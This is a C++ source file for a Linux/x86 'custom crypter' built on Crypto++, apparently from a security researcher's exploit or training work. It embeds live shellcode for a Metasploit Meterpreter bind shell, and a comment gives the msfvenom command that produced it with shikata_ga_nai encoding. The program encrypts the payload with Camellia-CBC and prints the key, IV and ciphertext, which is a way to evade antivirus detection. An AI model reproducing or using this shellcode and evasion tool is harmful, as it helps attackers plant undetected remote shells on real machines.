/* 
 * Title:    Custom Crypter (crypter.cpp)
 * Platform: Linux/x86
 * Date:     2015-04-28
 * Author:   Julien Ahrens (@MrTuxracer)
 * Website:  http://www.rcesecurity.com 
 * Based on: https://www.cryptopp.com/wiki/Camellia
 *
 * Instructions:
 * Compile using (on x64):
 * g++ -I/usr/include/cryptopp crypter.cpp -o crypter -lcryptopp -m32
*/

#include "osrng.h"
using CryptoPP::AutoSeededRandomPool;

#include <iostream>
using std::cout;
using std::cerr;
using std::endl;

#include <string>
using std::string;

#include <cstdlib>
using std::exit;

#include "cryptlib.h"
using CryptoPP::Exception;

#include "hex.h"
using CryptoPP::HexEncoder;

#include "filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "camellia.h"
using CryptoPP::Camellia;

#include "modes.h"
using CryptoPP::CBC_Mode;

#include "secblock.h"
using CryptoPP::SecByteBlock;

/*
 * Set the the payload! Key and IV will be generated randomly
 * Make sure the payload is free of NULL bytes, otherwise the crypter will break 
 * 
 * Example payload:
 * msfvenom -e x86/shikata_ga_nai -i 5 -p linux/x86/meterpreter/bind_tcp LPORT=1337 R | hexdump -v -e '"\\\x" 1/1 "%02x"'
*/
string payload = "\xb8\xbe\x32\x43\x9c\xdb\xc5\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x37\x83\xea\xfc\x31\x42\x10\x03\x42\x10\x5c\xc7\x9a\x70\x18\x01\xb2\xc5\x6e\x8b\xb8\xf1\x7a\x70\x68\x33\x33\xb7\x5b\x80\x29\xbb\xd8\x1c\xce\x78\xda\xc2\x0c\x6b\xf3\xad\x58\xe8\x80\xb6\x71\xe4\xc0\xd5\xc8\xdb\x61\x1b\x39\x78\xcc\x59\x6f\x72\x10\xde\x17\x17\x58\x7b\x91\x2d\xbc\x3e\xd8\x90\xf5\x81\xc4\x0f\x78\x1c\x34\xc3\x1f\x86\x93\xdb\x7e\x9c\xf7\xc4\x02\x26\xea\xf2\xd6\x13\x57\x60\x48\xab\xf5\x29\xc9\x4a\x0d\x32\xb2\x60\x83\x7c\xf6\x48\xa5\x72\x0f\x47\xf0\xb6\xeb\xad\x9e\xd8\x02\x56\xcc\x71\x13\x26\x6d\x80\xd8\xbb\xe0\x05\x2b\xe0\xbd\x53\xf5\x65\x7c\xb5\x44\x11\x1e\xe5\x3d\xcb\x3e\x16\xcb\xe9\xca\xa4\x2e\x1e\x27\xda\x5b\xe0\x31\x91\x06\x34\xb4\xa7\x4e\xe9\x91\xf9\xae\x76\x9a\xb7\xd6\x0a\x1e\x33\x88\xe8\xf9\x23\x89\x5e\x34\x99\x64\x58\xfa\xce\x97\xa3\x8b\xff\x2a\xeb\xdc\xd7\xa1\x18\x1d\xb9\x2a\xce\x9f\x02\xc6\x77\x77\xb1\x2a\x49\x9f\xb1\xe3\x09\x07\xcc\x36\x53\x0e\xfc\x58\x5a\xd7\x08\x0a\xa4\x62\x8e\x45\x30";

/*
 * Function to encode strings using CryptoPP's HexEncoder to a StringSink
 * input("decoded") is encoded to output("encoded")
 * pumpAll is set to true to get the whole data at once
*/
string encode(unsigned char *decoded, int size)
{
	string encoded;   
	StringSource(decoded, size, true,
		new HexEncoder(
			new StringSink(encoded)
		) 
	); 
	return encoded;
}

int main(int argc, char* argv[]) {
	// Init pseudo random number generator
	AutoSeededRandomPool prng;

	// Generate key with 32 bytes
	SecByteBlock key(Camellia::MAX_KEYLENGTH);
	prng.GenerateBlock(key, key.size());
	// Dump key
	cout << "Key: " << encode(key, key.size()) << endl;

	// Generate IV with 16 bytes
	byte iv[Camellia::BLOCKSIZE];
	prng.GenerateBlock(iv, sizeof(iv));
	// Dump iv	
	cout << "IV: " << encode(iv, sizeof(iv)) << endl;
	
    /*
     * Start encryption
    */    
    try
	{
		// Cipher will contain the encrypted payload later
		string cipher;
		
		// Use Camellia with CBC mode
		CBC_Mode< Camellia >::Encryption e;
		// Initialize encryption parameters key and iv
		e.SetKeyWithIV(key, key.size(), iv);

		// The StreamTransformationFilter adds padding
		// as required. ECB and CBC Mode must be padded
		// to the block size of the cipher.
		StringSource(payload, true, 
			new StreamTransformationFilter(e,
				new StringSink(cipher)
			)    
		); 
		
		// Dump cipher text
		string encoded_cipher;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(encoded_cipher)
			) 
		); 
		cout << "Ciphertext: " << encoded_cipher << endl;
	}
	// Catch exceptions if they occur during encryption
	catch(const CryptoPP::Exception& e)
	{
		cerr << e.what() << endl;
		exit(1);
	}

    return 0;
}
